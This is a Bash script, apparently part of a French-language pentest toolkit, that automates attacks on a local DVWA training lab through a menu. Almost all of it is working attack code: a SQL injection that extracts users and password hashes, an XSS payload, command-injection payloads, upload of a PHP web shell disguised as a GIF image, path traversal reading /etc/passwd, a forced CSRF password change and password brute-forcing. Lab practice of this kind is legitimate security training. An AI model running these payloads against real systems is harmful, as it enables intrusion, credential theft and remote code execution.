#!/bin/bash
# modules/labs/dvwa/exploits.sh - Enterprise Grade v4.2
# Version finale uniformisée et verbose

source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh
source ~/ghost00ls/lib/exploits_common.sh

LOG_DIR="${HOME}/ghost00ls/logs/dvwa_exploits"
mkdir -p "$LOG_DIR"

detect_security_level() {
    local cookie_jar="$1"
    local base_url="$2"
    local resp=$(curl -s -b "$cookie_jar" -H "User-Agent: Mozilla/5.0" "${base_url}/security.php" 2>/dev/null)
    
    if echo "$resp" | grep -qi "selected.*low"; then
        echo "low"
    elif echo "$resp" | grep -qi "selected.*medium"; then
        echo "medium"
    elif echo "$resp" | grep -qi "selected.*high"; then
        echo "high"
    else
        echo "low"
    fi
}

init_dvwa_session() {
    local cookie_jar="$1"
    local base_url="$2"
    
    echo -e "${YELLOW}Initialisation session DVWA...${NC}"
    curl -s -b "$cookie_jar" -c "$cookie_jar" -H "User-Agent: Mozilla/5.0" "${base_url}/index.php" >/dev/null 2>&1
    sleep 1
    curl -s -b "$cookie_jar" -c "$cookie_jar" -H "User-Agent: Mozilla/5.0" -X POST -d "security=low&seclev_submit=Submit" "${base_url}/security.php" >/dev/null 2>&1
    sleep 1
    
    local level=$(detect_security_level "$cookie_jar" "$base_url")
    echo -e "${CYAN}Security Level: $level${NC}"
    
    return 0
}

force_security_low() {
    init_dvwa_session "$1" "$2"
}

exploit_sqli() {
    clear
    banner
    echo -e "${MAGENTA}[SQL Injection - Detection Avancee]${NC}"
    echo -e "${CYAN}Objectif : Extraction de donnees via SQLi${NC}"
    echo -e "${YELLOW}Risque : Fuite de donnees sensibles${NC}"
    echo -e "${GREEN}Mitigation : Prepared statements${NC}"
    echo
    
    check_tools curl || { read -p "👉 Entrée pour continuer... "; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "IP [$IP]: " input; IP=${input:-$IP}
    read -p "Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    echo -e "\n${YELLOW}Authentification...${NC}"
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    local session=$(echo "$result" | cut -d'|' -f2)
    
    if [ -z "$session" ]; then
        echo -e "${RED}Echec authentification${NC}"
        read -p "👉 Entrée pour continuer... "
        return
    fi
    
    echo -e "${GREEN}Authentifie${NC}"
    init_dvwa_session "$cookie_jar" "$BASE"
    
    echo -e "\n${YELLOW}Test SQLi...${NC}\n"
    
    local url="${BASE}/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit"
    local tmpf=$(mktemp)
    curl -s -b "$cookie_jar" -H "User-Agent: Mozilla/5.0" --max-time 10 "$url" > "$tmpf" 2>/dev/null
    
    if grep -qi "admin" "$tmpf" && grep -qi "gordon\|pablo\|surname" "$tmpf"; then
        echo -e "${GREEN}SQLi SUCCESS !${NC}"
        log_exploit "${LOG_DIR}/sqli.log" "SUCCESS" "SQLi"
        
        echo -e "\n${CYAN}Utilisateurs:${NC}"
        grep -ioE "admin|gordon|pablo|hack|bob" "$tmpf" | sort -u | sed 's/^/   - /'
        
        local hashes=$(grep -oE "[a-f0-9]{32}" "$tmpf" | head -n 5)
        if [ -n "$hashes" ]; then
            echo -e "\n${GREEN}Hash MD5:${NC}"
            echo "$hashes" | sed 's/^/   - /'
        fi
    else
        echo -e "${YELLOW}Aucune donnee${NC}"
    fi
    
    rm -f "$tmpf"
    cleanup_cookie_jar "$cookie_jar"
    read -p "
👉 Entrée pour continuer...  "
}

exploit_xss() {
    clear
    banner
    echo -e "${MAGENTA}[XSS Reflected]${NC}"
    echo -e "${CYAN}Objectif : Injection de scripts${NC}"
    echo -e "${YELLOW}Risque : Session hijacking${NC}"
    echo -e "${GREEN}Mitigation : Output encoding${NC}"
    echo
    
    check_tools curl || { read -p "👉 Entrée pour continuer... "; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "IP [$IP]: " input; IP=${input:-$IP}
    read -p "Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    
    init_dvwa_session "$cookie_jar" "$BASE"
    
    echo -e "\n${YELLOW}Test XSS...${NC}\n"
    
    local payload='<script>alert(1)</script>'
    local enc=$(urlenc "$payload")
    local url="${BASE}/vulnerabilities/xss_r/?name=${enc}"
    
    local tmpf=$(mktemp)
    curl -s -b "$cookie_jar" -H "User-Agent: Mozilla/5.0" "$url" > "$tmpf" 2>/dev/null
    
    if grep -F "$payload" "$tmpf" >/dev/null 2>&1; then
        echo -e "${GREEN}XSS SUCCESS !${NC}"
        log_exploit "${LOG_DIR}/xss.log" "SUCCESS" "XSS"
    else
        echo -e "${YELLOW}Payload bloque${NC}"
    fi
    
    rm -f "$tmpf"
    cleanup_cookie_jar "$cookie_jar"
    read -p "
👉 Entrée pour continuer...  "
}

exploit_cmdinj() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║   Command Injection - Detection Avancee  ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Objectif : Execution de commandes systeme${NC}"
    echo -e "${YELLOW}⚠️  Risque : RCE - Remote Code Execution${NC}"
    echo -e "${GREEN}🛡️  Mitigation : Input validation, whitelist${NC}"
    echo
    
    check_tools curl || { read -p "👉 Entrée pour continuer... "; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "🌐 IP [$IP]: " input; IP=${input:-$IP}
    read -p "🔌 Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    echo -e "\n${YELLOW}🔐 Authentification en cours...${NC}"
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    
    echo -e "${GREEN}✅ Authentifie${NC}"
    
    init_dvwa_session "$cookie_jar" "$BASE"
    
    echo -e "\n${YELLOW}🔍 Test Command Injection avec 5 payloads...${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
    
    local success=0
    local payloads=(
        "127.0.0.1%3Bid"
        "127.0.0.1%3B+id"
        "127.0.0.1+%26%26+id"
        "127.0.0.1+%7C+id"
        "127.0.0.1%3Bwhoami"
    )
    
    local names=(
        "127.0.0.1;id"
        "127.0.0.1; id"
        "127.0.0.1 && id"
        "127.0.0.1 | id"
        "127.0.0.1;whoami"
    )
    
    local idx=0
    for encoded in "${payloads[@]}"; do
        local url="${BASE}/vulnerabilities/exec/?ip=${encoded}&Submit=Submit"
        
        echo -e "${CYAN}[Test $((idx+1))/5] Payload: ${names[$idx]}${NC}"
        
        local tmpf=$(mktemp)
        curl -s -b "$cookie_jar" -H "User-Agent: Mozilla/5.0" --max-time 10 "$url" > "$tmpf" 2>/dev/null
        
        local response_size=$(wc -c < "$tmpf")
        echo -e "  ${YELLOW}├─ Taille reponse: $response_size bytes${NC}"
        
        if grep -q "uid=" "$tmpf" || grep -qi "www-data\|root" "$tmpf"; then
            echo -e "  ${GREEN}└─ ✅ Execution detectee !${NC}"
            
            echo -e "\n${GREEN}╔═══════════════════════════════════════╗${NC}"
            echo -e "${GREEN}║  ✅ Command Injection SUCCESS !       ║${NC}"
            echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"
            log_exploit "${LOG_DIR}/cmdinj.log" "SUCCESS" "CmdInj: ${names[$idx]}"
            
            echo -e "\n${CYAN}📊 Output de la commande:${NC}"
            echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
            grep -A 5 "uid=\|www-data" "$tmpf" | sed 's/<[^>]*>//g' | head -n 10 | sed 's/^/   /'
            
            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "  ${YELLOW}└─ ⚠️  Pas d'execution${NC}"
        fi
        
        rm -f "$tmpf"
        echo
        idx=$((idx+1))
    done
    
    if [ $success -eq 0 ]; then
        echo -e "${RED}╔═══════════════════════════════════════╗${NC}"
        echo -e "${RED}║  ❌ Aucune execution detectee         ║${NC}"
        echo -e "${RED}╚═══════════════════════════════════════╝${NC}"
        echo -e "${YELLOW}💡 Input validation active ou commandes bloquees${NC}"
    fi
    
    cleanup_cookie_jar "$cookie_jar"
    read -p "
👉 Entrée pour continuer... "
}

exploit_upload() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║      File Upload - Detection Avancee      ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Objectif : Upload et execution de webshell${NC}"
    echo -e "${YELLOW}⚠️  Risque : RCE via webshell, backdoor${NC}"
    echo -e "${GREEN}🛡️  Mitigation : Type validation, permissions${NC}"
    echo
    
    check_tools curl || { read -p "👉 Entrée pour continuer... "; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "🌐 IP [$IP]: " input; IP=${input:-$IP}
    read -p "🔌 Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    echo -e "\n${YELLOW}🔐 Authentification en cours...${NC}"
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    
    echo -e "${GREEN}✅ Authentifie${NC}"
    
    init_dvwa_session "$cookie_jar" "$BASE"
    
    local workdir=$(mktemp -d)
    
    echo '<?php echo "GHOST_SHELL_OK"; ?>' > "${workdir}/shell.php"
    echo 'GIF89a<?php system($_GET["cmd"]); ?>' > "${workdir}/shell.php.jpg"
    
    echo -e "\n${YELLOW}🔍 Test upload avec 2 techniques...${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
    
    local files=("shell.php" "shell.php.jpg")
    local success=0
    local idx=1
    
    for file in "${files[@]}"; do
        local filepath="${workdir}/${file}"
        
        echo -e "${CYAN}[Test $idx/2] Upload: $file${NC}"
        
        local tmpf=$(mktemp)
        curl -s -b "$cookie_jar" -H "User-Agent: Mozilla/5.0" --max-time 10 \
            -F "uploaded=@${filepath};filename=${file}" \
            -F "Upload=Upload" \
            "${BASE}/vulnerabilities/upload/" > "$tmpf" 2>/dev/null
        
        local response_size=$(wc -c < "$tmpf")
        echo -e "  ${YELLOW}├─ Taille reponse: $response_size bytes${NC}"
        
        if grep -qi "successfully uploaded\|has been uploaded\|succesfully" "$tmpf"; then
            echo -e "  ${GREEN}├─ ✅ Upload reussi !${NC}"
            
            local test_url="${BASE}/hackable/uploads/${file}"
            echo -e "  ${YELLOW}└─ Test execution: $test_url${NC}"
            
            local exec_resp=$(curl -s -H "User-Agent: Mozilla/5.0" --max-time 5 "$test_url" 2>/dev/null)
            
            if echo "$exec_resp" | grep -q "GHOST_SHELL_OK"; then
                echo -e "\n${GREEN}╔═══════════════════════════════════════╗${NC}"
                echo -e "${GREEN}║  ✅ Upload + Execution SUCCESS !      ║${NC}"
                echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"
                echo -e "\n${CYAN}📊 Details:${NC}"
                echo -e "   ${GREEN}├─ Fichier: $file${NC}"
                echo -e "   ${GREEN}├─ URL: $test_url${NC}"
                echo -e "   ${GREEN}└─ Shell actif !${NC}"
                log_exploit "${LOG_DIR}/upload.log" "SUCCESS" "Upload: $file"
                success=1
                break
            else
                echo -e "     ${YELLOW}⚠️  Fichier non executable${NC}"
            fi
        else
            echo -e "  ${RED}└─ ✗ Upload refuse${NC}"
            
            if grep -qi "not allowed\|invalid" "$tmpf"; then
                echo -e "     ${RED}Raison: Type de fichier non autorise${NC}"
            fi
        fi
        
        rm -f "$tmpf"
        echo
        idx=$((idx+1))
    done
    
    if [ $success -eq 0 ]; then
        echo -e "${RED}╔═══════════════════════════════════════╗${NC}"
        echo -e "${RED}║  ❌ Aucun upload reussi               ║${NC}"
        echo -e "${RED}╚═══════════════════════════════════════╝${NC}"
        echo -e "${YELLOW}💡 Type validation active ou permissions insuffisantes${NC}"
    fi
    
    rm -rf "$workdir"
    cleanup_cookie_jar "$cookie_jar"
    read -p "
👉 Entrée pour continuer... "
}

exploit_lfi() {
    clear
    banner
    echo -e "${MAGENTA}[LFI]${NC}"
    echo -e "${CYAN}Objectif : Lecture fichiers${NC}"
    echo -e "${YELLOW}Risque : Info disclosure${NC}"
    echo -e "${GREEN}Mitigation : Path validation${NC}"
    echo
    
    check_tools curl || { read -p "👉 Entrée pour continuer... "; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "IP [$IP]: " input; IP=${input:-$IP}
    read -p "Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    
    init_dvwa_session "$cookie_jar" "$BASE"
    
    echo -e "\n${YELLOW}Test LFI...${NC}\n"
    
    local url="${BASE}/vulnerabilities/fi/?page=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
    local tmpf=$(mktemp)
    curl -s -b "$cookie_jar" -H "User-Agent: Mozilla/5.0" "$url" > "$tmpf" 2>/dev/null
    
    if grep -q "root:x:0:0" "$tmpf"; then
        echo -e "${GREEN}LFI SUCCESS !${NC}"
        log_exploit "${LOG_DIR}/lfi.log" "SUCCESS" "LFI"
        
        echo -e "\n${CYAN}Extrait:${NC}"
        head -n 10 "$tmpf" | grep -v "^$" | sed 's/^/   /'
    else
        echo -e "${RED}Non accessible${NC}"
    fi
    
    rm -f "$tmpf"
    cleanup_cookie_jar "$cookie_jar"
    read -p "
👉 Entrée pour continuer...  "
}

exploit_csrf() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║    CSRF - Cross-Site Request Forgery      ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Objectif : Forcer une action non autorisee${NC}"
    echo -e "${YELLOW}⚠️  Risque : Actions au nom de la victime${NC}"
    echo -e "${GREEN}🛡️  Mitigation : CSRF tokens, SameSite cookies${NC}"
    echo
    
    check_tools curl || { read -p "👉 Entrée pour continuer... "; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "🌐 IP [$IP]: " input; IP=${input:-$IP}
    read -p "🔌 Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    echo -e "\n${YELLOW}🔐 Authentification en cours...${NC}"
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    
    echo -e "${GREEN}✅ Authentifie${NC}"
    
    init_dvwa_session "$cookie_jar" "$BASE"
    
    echo -e "\n${YELLOW}🔍 Analyse du formulaire CSRF...${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
    
    local tmpf=$(mktemp)
    curl -s -b "$cookie_jar" -H "User-Agent: Mozilla/5.0" "${BASE}/vulnerabilities/csrf/" > "$tmpf" 2>/dev/null
    
    local response_size=$(wc -c < "$tmpf")
    echo -e "${YELLOW}├─ Taille page CSRF: $response_size bytes${NC}"
    
    local has_token=$(grep -o "user_token" "$tmpf")
    
    if [ -z "$has_token" ]; then
        echo -e "${GREEN}└─ ✅ Pas de token CSRF - VULNERABLE${NC}"
    else
        echo -e "${YELLOW}└─ ⚠️  Token CSRF present dans le formulaire${NC}"
    fi
    
    rm -f "$tmpf"
    
    echo -e "\n${YELLOW}Test 1: Changement password SANS token...${NC}"
    
    local resp=$(curl -s -b "$cookie_jar" -H "User-Agent: Mozilla/5.0" \
        "${BASE}/vulnerabilities/csrf/?password_new=ghost123&password_conf=ghost123&Change=Change" 2>/dev/null)
    
    local resp_size=$(echo "$resp" | wc -c)
    echo -e "${YELLOW}├─ Taille reponse: $resp_size bytes${NC}"
    
    if echo "$resp" | grep -qi "password.*changed\|password.*updated\|successfully"; then
        echo -e "${GREEN}└─ ✅ Password change sans token !${NC}"
        
        echo -e "\n${GREEN}╔═══════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║  ✅ CSRF SUCCESS !                    ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"
        log_exploit "${LOG_DIR}/csrf.log" "SUCCESS" "CSRF"
        
        echo -e "\n${CYAN}📊 Details:${NC}"
        echo -e "   ${GREEN}├─ Action: Password change${NC}"
        echo -e "   ${GREEN}├─ Token requis: NON${NC}"
        echo -e "   ${GREEN}└─ Nouveau password: ghost123${NC}"
    else
        echo -e "${RED}└─ ✗ Echec - Token probablement requis${NC}"
        
        echo -e "\n${RED}╔═══════════════════════════════════════╗${NC}"
        echo -e "${RED}║  ❌ Protection CSRF active            ║${NC}"
        echo -e "${RED}╚═══════════════════════════════════════╝${NC}"
    fi
    
    cleanup_cookie_jar "$cookie_jar"
    read -p "
👉 Entrée pour continuer... "
}

exploit_bruteforce() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║       Brute Force - Login Attack          ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Objectif : Casser le mot de passe admin${NC}"
    echo -e "${YELLOW}⚠️  Risque : Acces non autorise au systeme${NC}"
    echo -e "${GREEN}🛡️  Mitigation : Rate limiting, CAPTCHA, lockout${NC}"
    echo
    
    check_tools curl || { read -p "👉 Entrée pour continuer... "; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "🌐 IP [$IP]: " input; IP=${input:-$IP}
    read -p "🔌 Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"
    
    local passwords=("password" "admin" "123456" "letmein" "Password1" "admin123" "dvwa" "test")
    
    echo -e "\n${YELLOW}🔍 Test Brute Force sur login...${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${CYAN}🎯 Target: admin${NC}"
    echo -e "${CYAN}📋 Wordlist: ${#passwords[@]} passwords${NC}\n"
    
    local success=0
    local idx=1
    
    for pass in "${passwords[@]}"; do
        echo -e "${CYAN}[Test $idx/${#passwords[@]}] Tentative: admin / $pass${NC}"
        
        local cookie_jar=$(create_cookie_jar)
        
        # Login avec user_token
        local login_page=$(curl -s -c "$cookie_jar" -H "User-Agent: Mozilla/5.0" "${BASE}/login.php" 2>/dev/null)
        local user_token=$(echo "$login_page" | grep -oP "user_token.*value='\K[^']+")
        
        echo -e "  ${YELLOW}├─ Token: ${user_token:0:16}...${NC}"
        
        if [ -n "$user_token" ]; then
            curl -s -b "$cookie_jar" -c "$cookie_jar" -H "User-Agent: Mozilla/5.0" -L \
                -d "username=admin&password=$pass&Login=Login&user_token=$user_token" \
                "${BASE}/login.php" >/dev/null 2>&1
        else
            curl -s -b "$cookie_jar" -c "$cookie_jar" -H "User-Agent: Mozilla/5.0" -L \
                -d "username=admin&password=$pass&Login=Login" \
                "${BASE}/login.php" >/dev/null 2>&1
        fi
        
        sleep 0.3
        
        # Verifier connexion
        local resp=$(curl -s -b "$cookie_jar" -H "User-Agent: Mozilla/5.0" "${BASE}/index.php" 2>/dev/null)
        
        if echo "$resp" | grep -qi "Logout\|Welcome.*admin"; then
            echo -e "  ${GREEN}└─ ✅ Connexion reussie !${NC}"
            
            echo -e "\n${GREEN}╔═══════════════════════════════════════╗${NC}"
            echo -e "${GREEN}║  ✅ BRUTE FORCE SUCCESS !             ║${NC}"
            echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"
            echo -e "\n${CYAN}📊 Credentials valides:${NC}"
            echo -e "   ${GREEN}├─ Username: admin${NC}"
            echo -e "   ${GREEN}├─ Password: $pass${NC}"
            echo -e "   ${GREEN}└─ Tentatives: $idx/${#passwords[@]}${NC}"
            log_exploit "${LOG_DIR}/bruteforce.log" "SUCCESS" "admin/$pass"
            success=1
            cleanup_cookie_jar "$cookie_jar"
            break
        else
            echo -e "  ${YELLOW}└─ ✗ Echec authentification${NC}"
        fi
        
        cleanup_cookie_jar "$cookie_jar"
        idx=$((idx+1))
        echo
    done
    
    if [ $success -eq 0 ]; then
        echo -e "${RED}╔═══════════════════════════════════════╗${NC}"
        echo -e "${RED}║  ❌ Aucun password trouve             ║${NC}"
        echo -e "${RED}╚═══════════════════════════════════════╝${NC}"
        echo -e "${YELLOW}💡 Le password n'est pas dans la wordlist${NC}"
        echo -e "${CYAN}ℹ️  Password par defaut DVWA: password${NC}"
    fi
    
    read -p "
👉 Entrée pour continuer... "
}

full_scan() {
    clear
    banner
    echo -e "${MAGENTA}[Full Scan DVWA]${NC}\n"
    
    local IP PORT
    IP=$(get_host_ip)
    
    read -p "IP [$IP]: " input; IP=${input:-$IP}
    read -p "Port [8081]: " PORT; PORT=${PORT:-8081}
    
    echo -e "\n${YELLOW}Scan en cours...${NC}\n"
    
    local report="${LOG_DIR}/scan_$(date +%Y%m%d_%H%M%S).txt"
    
    echo "DVWA Full Scan" | tee "$report"
    echo "Date: $(date)" | tee -a "$report"
    echo "Target: http://${IP}:${PORT}" | tee -a "$report"
    echo "==============================" | tee -a "$report"
    
    local result=$(login_form "http://${IP}:${PORT}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    init_dvwa_session "$cookie_jar" "http://${IP}:${PORT}"
    
    echo "[1/5] SQLi..." | tee -a "$report"
    curl -s -b "$cookie_jar" -H "User-Agent: Mozilla/5.0" "http://${IP}:${PORT}/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit" | grep -q "admin" && echo "SQLi: VULN" | tee -a "$report" || echo "SQLi: OK" | tee -a "$report"
    
    echo "[2/5] XSS..." | tee -a "$report"
    curl -s -b "$cookie_jar" -H "User-Agent: Mozilla/5.0" "http://${IP}:${PORT}/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" | grep -q "<script>alert" && echo "XSS: VULN" | tee -a "$report" || echo "XSS: OK" | tee -a "$report"
    
    echo "[3/5] CmdInj..." | tee -a "$report"
    curl -s -b "$cookie_jar" -H "User-Agent: Mozilla/5.0" "http://${IP}:${PORT}/vulnerabilities/exec/?ip=127.0.0.1%3Bid&Submit=Submit" | grep -q "uid=" && echo "CmdInj: VULN" | tee -a "$report" || echo "CmdInj: OK" | tee -a "$report"
    
    echo "[4/5] LFI..." | tee -a "$report"
    curl -s -b "$cookie_jar" -H "User-Agent: Mozilla/5.0" "http://${IP}:${PORT}/vulnerabilities/fi/?page=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" | grep -q "root:x:0" && echo "LFI: VULN" | tee -a "$report" || echo "LFI: OK" | tee -a "$report"
    
    echo "[5/5] CSRF..." | tee -a "$report"
    curl -s -b "$cookie_jar" -H "User-Agent: Mozilla/5.0" "http://${IP}:${PORT}/vulnerabilities/csrf/" | grep -qv "user_token" && echo "CSRF: VULN" | tee -a "$report" || echo "CSRF: OK" | tee -a "$report"
    
    echo "==============================" | tee -a "$report"
    echo "Rapport: $report"
    
    cleanup_cookie_jar "$cookie_jar"
    
    echo
    echo -e "${GREEN}Scan termine !${NC}"
    echo -e "${CYAN}Rapport: $report${NC}"
    
    read -p "
👉 Entrée pour continuer...  "
}

menu_exploits() {
    while true; do
        clear
        banner
        echo -e "${CYAN}=== Exploits DVWA v4.2 ===${NC}"
        echo
        echo -e "${GREEN}1) SQL Injection${NC}"
        echo -e "${GREEN}2) XSS Reflected${NC}"
        echo -e "${GREEN}3) Command Injection${NC}"
        echo -e "${GREEN}4) File Upload${NC}"
        echo -e "${GREEN}5) LFI${NC}"
        echo -e "${GREEN}6) CSRF${NC}"
        echo -e "${GREEN}7) Brute Force${NC}"
        echo -e "${CYAN}8) Full Scan${NC}"
        echo -e "${MAGENTA}9) Logs${NC}"
        echo -e "${RED}0) Retour${NC}"
        echo
        read -p "Choix : " choice

        case $choice in
            1) exploit_sqli ;;
            2) exploit_xss ;;
            3) exploit_cmdinj ;;
            4) exploit_upload ;;
            5) exploit_lfi ;;
            6) exploit_csrf ;;
            7) exploit_bruteforce ;;
            8) full_scan ;;
            9) 
                clear
                banner
                echo -e "${CYAN}=== Logs ===${NC}\n"
                for log in "$LOG_DIR"/*.log; do
                    [ -f "$log" ] && echo "=== $(basename "$log") ===" && tail -n 5 "$log" && echo
                done
                read -p "👉 Entrée pour continuer... "
                ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    menu_exploits
fi
